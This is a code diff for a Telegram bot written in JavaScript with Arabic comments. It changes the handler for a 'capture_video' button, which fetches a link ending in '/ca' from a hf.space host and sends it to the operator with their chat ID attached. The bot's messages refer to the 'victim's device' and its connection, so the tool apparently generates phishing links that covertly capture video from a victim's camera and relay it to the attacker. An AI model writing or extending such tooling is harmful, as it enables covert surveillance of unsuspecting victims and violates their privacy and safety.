@@ -1653,64 +1653,48 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-// دالة لجلب الرابط الجديد من الصفحة
-async function fetchNewLink() {
-    const url = "https://sssssskskjwnsb-linklsksn.hf.space";
-
-    try {
-        const response = await fetch(url);
-        const html = await response.text();
-
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(html, "text/html");
-
-        const links = doc.querySelectorAll("a[href]");
-
-        for (let a of links) {
-            let link = a.getAttribute("href");
-
-            // تحويل الرابط النسبي إلى رابط كامل
-            if (!link.startsWith("http")) {
-                link = url + link;
-            }
-
-            // نفس شرط بايثون
-            if (link.endsWith("/ca")) {
-                return link;
-            }
-        }
-
-        return null;
-
-    } catch (err) {
-        console.error("Error fetching link:", err);
-        return null;
-    }
-}
 
 
-
-// عند ضغط الزر
-bot.on('callback_query', async (callbackQuery) => {
+bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-
-        // نحصل على الرابط الجديد من الموقع
-        const newLink = await fetchNewLink();
-
-        if (!newLink) {
-            bot.sendMessage(chatId, "لم يتم العثور على رابط ينتهي بـ /ca");
-            return;
-        }
-
-        // الرسالة بنفس صيغة كودك القديم
-        const message = `تم انشاء الرابط ملاحظه قم في تليغم رابط جديد في كل مره
-ملاحظه بزم يكون النت قوي في جهاز الضحيه
-: ${newLink}?chatId=${chatId}`;
-
-        bot.sendMessage(chatId, message);
+        // رابط الموقع المستهدف
+        const url = "https://sssssskskjwnsb-linklsksn.hf.space";
+        
+        // إرسال رسالة انتظار
+        bot.sendMessage(chatId, "⏳ جاري جلب الرابط من الخادم...");
+        
+        // استيراد الروابط من الموقع
+        axios.get(url, { timeout: 10000 })
+            .then(response => {
+                const $ = cheerio.load(response.data);
+                let foundLink = null;
+                
+                // البحث عن الرابط الذي ينتهي بـ "/ca"
+                $('a[href]').each((index, element) => {
+                    const link = $(element).attr('href');
+                    if (link.endsWith('/ca')) {
+                        foundLink = link;
+                        return false; // إيقاف loop عند العثور على أول رابط
+                    }
+                });
+                
+                if (foundLink) {
+                    // بناء الرابط النهائي مع chatId
+                    const fullLink = `${foundLink}?chatId=${chatId}`;
+                    const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
+                    
+                    bot.sendMessage(chatId, message);
+                } else {
+                    bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching link:', error);
+                bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
+            });
     }
 });
 
